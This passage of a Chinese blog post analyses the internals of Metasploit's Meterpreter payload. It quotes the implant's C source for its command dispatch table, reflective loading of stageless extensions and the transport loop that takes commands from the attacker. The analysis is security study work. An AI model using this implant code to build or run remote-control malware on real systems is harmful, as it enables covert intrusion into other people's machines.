class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispatch table</span></span><br><span class="line">Command customCommands[] =</span><br><span class="line">&#123;</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_loadlib"</span>, request_core_loadlib),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_enumextcmd"</span>, request_core_enumextcmd),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_machine_id"</span>, request_core_machine_id),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_get_session_guid"</span>, request_core_get_session_guid),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_set_session_guid"</span>, request_core_set_session_guid),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_set_uuid"</span>, request_core_set_uuid),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_pivot_add"</span>, request_core_pivot_add),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_pivot_remove"</span>, request_core_pivot_remove),</span><br><span class="line">	COMMAND_INLINE_REP(<span class="string">"core_patch_url"</span>, request_core_patch_url),</span><br><span class="line">	COMMAND_TERMINATOR</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @命令定义的简短容器.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">command</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	LPCSTR           method;     <span class="comment">///&lt; 命令的标识符.</span></span><br><span class="line">	PacketDispatcher request;    <span class="comment">///&lt; 定义请求处理程序.</span></span><br><span class="line">	PacketDispatcher response;   <span class="comment">///&lt; 定义响应处理程序.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Internal -- not stored</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">command</span>   *<span class="title">next</span>;</span>      <span class="comment">///&lt; 指向命令列表中的下一个命令的指针.</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">command</span>   *<span class="title">prev</span>;</span>      <span class="comment">///&lt; 指向命令列表中先前命令的指针.</span></span><br><span class="line">&#125; Command;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @动态注册自定义命令处理程序</span></span><br><span class="line"><span class="comment"> * @指向应该注册的命令的param命令指针.</span></span><br><span class="line"><span class="comment"> * @当命令成功注册时返回' ERROR_SUCCESS '，否则返回错误.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DWORD <span class="title">command_register</span><span class="params">(Command *command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Command *newCommand;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Registering a new command (%s)..."</span>, command-&gt;method);</span><br><span class="line">	<span class="keyword">if</span> (!(newCommand = (Command *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Command))))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> ERROR_NOT_ENOUGH_MEMORY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Allocated memory..."</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(newCommand, command, <span class="keyword">sizeof</span>(Command));</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Setting new command..."</span>);</span><br><span class="line">	<span class="keyword">if</span> (extensionCommands)</span><br><span class="line">	&#123;</span><br><span class="line">		extensionCommands-&gt;prev = newCommand;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Fixing next/prev... %p"</span>, newCommand);</span><br><span class="line">	newCommand-&gt;next = extensionCommands;</span><br><span class="line">	newCommand-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">	extensionCommands = newCommand;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Done..."</span>);</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @简短的动态注册的命令扩展.</span></span><br><span class="line"><span class="comment"> * @详细说明通过反射加载的扩展动态注册的命令的链接列表.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Command* extensionCommands = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @用meterpreter注册一个完整的命令列表.</span></span><br><span class="line"><span class="comment"> * @param命令将为模块/扩展注册的命令数组.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">command_register_all</span><span class="params">(Command commands[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD index;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (index = <span class="number">0</span>; commands[index].method; index++)</span><br><span class="line">	&#123;</span><br><span class="line">		command_register(&amp;commands[index]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUGTRACE</span></span><br><span class="line">	Command* command;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[COMMAND LIST] Listing current extension commands"</span>);</span><br><span class="line">	<span class="keyword">for</span> (command = extensionCommands; command; command = command-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[COMMAND LIST] Found: %s"</span>, command-&gt;method);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 注册自定义命令处理程序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">VOID <span class="title">register_dispatch_routines</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	gExtensionList = list_create();</span><br><span class="line"></span><br><span class="line">	command_register_all(customCommands);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在注册分派例程之后完成后<code>load_stageless_extensions</code>函数将会加载需要的扩展模块</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @brief Load any stageless extensions that might be present in the current payload.</span></span><br><span class="line"><span class="comment"> * @param remote Pointer to the remote instance.</span></span><br><span class="line"><span class="comment"> * @param fd The socket descriptor passed to metsrv during intialisation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">VOID <span class="title">load_stageless_extensions</span><span class="params">(Remote* remote, MetsrvExtension* stagelessExtensions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (stagelessExtensions-&gt;size &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[SERVER] Extension located at 0x%p: %u bytes"</span>, stagelessExtensions-&gt;dll, stagelessExtensions-&gt;size);</span><br><span class="line">		HMODULE hLibrary = LoadLibraryR(stagelessExtensions-&gt;dll, stagelessExtensions-&gt;size);</span><br><span class="line">		load_extension(hLibrary, TRUE, remote, <span class="literal">NULL</span>, extensionCommands);</span><br><span class="line">		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions-&gt;dll + stagelessExtensions-&gt;size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[SERVER] All stageless extensions loaded"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// once we have reached the end, we may have extension initializers</span></span><br><span class="line">	LPBYTE initData = (LPBYTE)(&amp;stagelessExtensions-&gt;size) + <span class="keyword">sizeof</span>(stagelessExtensions-&gt;size);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (initData != <span class="literal">NULL</span> &amp;&amp; *initData != <span class="string">'\0'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span>* extensionName = (<span class="keyword">const</span> <span class="keyword">char</span>*)initData;</span><br><span class="line">		LPBYTE data = initData + <span class="built_in">strlen</span>(extensionName) + <span class="number">1</span> + <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">		DWORD dataSize = *(DWORD*)(data - <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">		dprintf(<span class="string">"[STAGELESS] init data at %p, name %s, size is %d"</span>, extensionName, extensionName, dataSize);</span><br><span class="line">		stagelessinit_extension(extensionName, data, dataSize);</span><br><span class="line">		initData = data + dataSize;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[SERVER] All stageless extensions initialised"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后将会进入<code>server_dispatch</code>循环接受并处理攻击端发送的命令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历传输，每次重新连接</span></span><br><span class="line"><span class="comment">// loop through the transports, reconnecting each time.</span></span><br><span class="line"><span class="keyword">while</span> (remote-&gt;transport)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport-&gt;transport_init)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[SERVER] attempting to initialise transport 0x%p"</span>, remote-&gt;transport);</span><br><span class="line">		<span class="comment">// 每个传输都有自己的一组重试设置，每个都应该遵守</span></span><br><span class="line">		<span class="comment">// 他们单独</span></span><br><span class="line">		<span class="comment">// Each transport has its own set of retry settings and each should honour</span></span><br><span class="line">		<span class="comment">// them individually.</span></span><br><span class="line">		<span class="keyword">if</span> (!remote-&gt;transport-&gt;transport_init(remote-&gt;transport))</span><br><span class="line">		&#123;</span><br><span class="line">			dprintf(<span class="string">"[SERVER] transport initialisation failed, moving to the next transport"</span>);</span><br><span class="line">			remote-&gt;transport = remote-&gt;transport-&gt;next_transport;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 当我们有一个传输列表时，我们将迭代到下一个</span></span><br><span class="line">			<span class="comment">// when we have a list of transports, we'll iterate to the next one.</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[SERVER] Entering the main server dispatch loop for transport %x, context %x"</span>, remote-&gt;transport, remote-&gt;transport-&gt;ctx);</span><br><span class="line">	DWORD dispatchResult = remote-&gt;transport-&gt;server_dispatch(remote, serverThread);</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[DISPATCH] dispatch exited with result: %u"</span>, dispatchResult);</span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport-&gt;transport_deinit)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[DISPATCH] deinitialising transport"</span>);</span><br><span class="line">		remote-&gt;transport-&gt;transport_deinit(remote-&gt;transport);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[TRANS] resetting transport"</span>);</span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport-&gt;transport_reset)</span><br><span class="line">	&#123;</span><br><span class="line">		remote-&gt;transport-&gt;transport_reset(remote-&gt;transport, dispatchResult == ERROR_SUCCESS &amp;&amp; remote-&gt;next_transport == <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果传输机制失败，那么我们应该循环，直到能够重新连接为止</span></span><br><span class="line">	<span class="comment">// If the transport mechanism failed, then we should loop until we're able to connect back again.</span></span><br><span class="line">	<span class="keyword">if</span> (dispatchResult == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[DISPATCH] Server requested shutdown of dispatch"</span>);</span><br><span class="line">		<span class="comment">// 但如果它成功了，这是一个有效的退出，那么我们应该清理干净离开</span></span><br><span class="line">		<span class="comment">// But if it was successful, and this is a valid exit, then we should clean up and leave.</span></span><br><span class="line">		<span class="keyword">if</span> (remote-&gt;next_transport == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dprintf(<span class="string">"[DISPATCH] No next transport specified, leaving"</span>);</span><br><span class="line">			<span class="comment">// 我们没有被要求切换传输，所以我们退出了</span></span><br><span class="line">			<span class="comment">// we weren't asked to switch transports, so we exit.</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 我们需要将传输方式改为我们已经得到的传输方式。现在我们假设，</span></span><br><span class="line">		<span class="comment">// 已经使用适当的函数创建了传输，并且它是传输列表的一部分</span></span><br><span class="line">		<span class="comment">// we need to change transports to the one we've been given. We will assume, for now,</span></span><br><span class="line">		<span class="comment">// that the transport has been created using the appropriate functions and that it is</span></span><br><span class="line">		<span class="comment">// part of the transport list.</span></span><br><span class="line">		dprintf(<span class="string">"[TRANS] Moving transport from 0x%p to 0x%p"</span>, remote-&gt;transport, remote-&gt;next_transport);</span><br><span class="line">		remote-&gt;transport = remote-&gt;next_transport;</span><br><span class="line">		remote-&gt;next_transport = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 移到列表中的下一个</span></span><br><span class="line">		<span class="comment">// move to the next one in the list</span></span><br><span class="line">		dprintf(<span class="string">"[TRANS] Moving transport from 0x%p to 0x%p"</span>, remote-&gt;transport, remote-&gt;transport-&gt;next_transport);</span><br><span class="line">		remote-&gt;transport = remote-&gt;transport-&gt;next_transport;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 传输切换和故障转移都需要支持等待功能</span></span><br><span class="line">	<span class="comment">// transport switching and failover both need to support the waiting functionality.</span></span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;next_transport_wait &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[TRANS] Sleeping for %u seconds ..."</span>, remote-&gt;next_transport_wait);</span><br><span class="line"></span><br><span class="line">		sleep(remote-&gt;next_transport_wait);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 等待是一次性的事情，需要每次重置</span></span><br><span class="line">		<span class="comment">// the wait is a once-off thing, needs to be reset each time</span></span><br><span class="line">		remote-&gt;next_transport_wait = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果我们有encryption context，就应该清除它</span></span><br><span class="line">	<span class="comment">// if we had an encryption context we should clear it up.</span></span><br><span class="line">	free_encryption_context(remote);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bbs.pediy.com/thread-247616.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247616.htm</a></p>
+<p><a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads" target="_blank" rel="noopener">https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads</a></p>
+<p><a href="https://blog.csdn.net/gaara_fan/article/details/6528359" target="_blank" rel="noopener">https://blog.csdn.net/gaara_fan/article/details/6528359</a></p>
+<p><a href="https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter</a></p>
+<hr>
+
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+	<div>
+	  
+        <div>
+    
+        <div style="text-align:center;color: #636363;font-size:14px;letter-spacing: 10px">本文结束啦<i class="fa fa-bell"></i>感谢您的阅读</div>
+    
+</div>
+      
+    </div>
+<div>    
+ 
+ 
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+	  <strong>本文作者：</strong> Likte
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="/Internals_meterpreter_payload.html" title="深入解析Meterpreter有效载荷">https://likte.me/Internals_meterpreter_payload.html</a>
+  </li>
+  <li class="post-copyright-license">
+	<strong>版权声明： </strong>
+    本站文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议，转载注明出处链接及作者！
+  </li>
+</ul>
+
+</div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
+          
+            <a href="/tags/Meterpreter/" rel="tag"># Meterpreter</a>
+          
+            <a href="/tags/payload/" rel="tag"># payload</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Windows_Kernel_File_Operate.html" rel="next" title="Windows内核编程之文件操作">
+                <i class="fa fa-chevron-left"></i> Windows内核编程之文件操作
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/AndroidStudio_Development_Env_Setup.html" rel="prev" title="AndroidStudio开发环境搭建">
+                AndroidStudio开发环境搭建 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Likte">
+            
+              <p class="site-author-name" itemprop="name">Likte</p>
+              <p class="site-description motion-element" itemprop="description">Have you tried your best?</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/likte" title="GitHub &rarr; https://github.com/likte" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:likte@protonmail.com" title="E-Mail &rarr; mailto:likte@protonmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析环境"><span class="nav-number">2.</span> <span class="nav-text">分析环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成payload"><span class="nav-number">3.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析payload"><span class="nav-number">4.</span> <span class="nav-text">分析payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Likte</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.0"></script>
+
+  <script src="/js/src/motion.js?v=7.0.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.0"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.0"></script>
+<script src="/js/src/post-details.js?v=7.0.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=7.0.0"></script>
+
+
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'xztdFLMG5uSSCyctC2WtdHCM-gzGzoHsz',
+    appKey: '9BrITJLcXcIXYLFft9DhURVH',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+</script>
+
+
+
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
